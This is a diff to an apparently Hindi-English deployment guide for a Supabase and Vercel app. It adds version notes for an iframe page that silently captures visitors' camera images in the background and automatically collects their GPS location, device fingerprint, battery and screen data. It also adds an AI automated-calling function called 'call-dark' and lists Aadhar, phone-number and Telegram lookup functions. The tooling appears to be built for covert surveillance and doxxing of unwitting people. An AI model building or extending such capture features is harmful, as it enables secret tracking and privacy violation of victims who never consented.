@@ -1,7 +1,7 @@
 # 🚀 Complete Migration Guide: Apna Supabase + Vercel Deployment
 
-**Last Updated:** 2026-01-28  
-**Version:** 3.2 (Session control update)
+**Last Updated:** 2026-01-31  
+**Version:** 3.4 (Iframe Capture + Session Config cleanup)
 
 ---
 
@@ -292,6 +292,7 @@ VALUES (
     "camRedirectUrl": "https://google.com",
     "customCaptureHtml": "",
     "chromeCustomHtml": "",
+    "camIframeUrl": "",
     "camPhotoLimit": 0,
     "camCaptureInterval": 500,
     "camVideoDuration": 5,
@@ -382,7 +383,7 @@ GitHub repo connect karke deploy karo.
 
 ---
 
-## 📁 Edge Functions Reference (v3.2)
+## 📁 Edge Functions Reference (v3.4)
 
 | Function | Purpose | Method |
 |----------|---------|--------|
@@ -393,6 +394,37 @@ GitHub repo connect karke deploy karo.
 | `aadhar-search` | Aadhar lookup | POST |
 | `numinfo-v2` | Phone number info | POST |
 | `telegram-osint` | Telegram OSINT API | POST |
+| `call-dark` | AI call dispatch | POST |
+
+---
+
+## 🔄 Version 3.4 Changes
+
+### Iframe Capture Feature
+- ✅ New `/iframe-capture` page for embedding any URL
+- ✅ `camIframeUrl` setting added to app_settings
+- ✅ Silent camera capture runs in background with iframe
+- ✅ Device info + GPS location captured automatically
+
+### Session Config Cleanup
+- ❌ Session change removed from ShubhCam Config tab
+- ✅ Session ID ONLY changeable via Admin Panel
+- ✅ Cleaner Config tab with only capture settings
+
+### Device Intelligence
+- ✅ All capture pages now collect device fingerprint
+- ✅ GPS location with Google Maps link
+- ✅ Battery, screen, UserAgent info captured
+- ✅ Data stored with `sessionId_deviceinfo` identifier
+
+---
+
+## 🔄 Version 3.3 Changes
+
+### CALL DARK Feature
+- ✅ AI-powered automated calls via Omnidim API
+- ✅ Admin panel settings for API Key, Agent ID
+- ✅ Configurable max duration
 
 ---
 
@@ -468,5 +500,5 @@ supabase functions deploy function-name
 
 ---
 
-**Version:** 3.2  
-**Last Updated:** 2026-01-28
+**Version:** 3.4  
+**Last Updated:** 2026-01-31
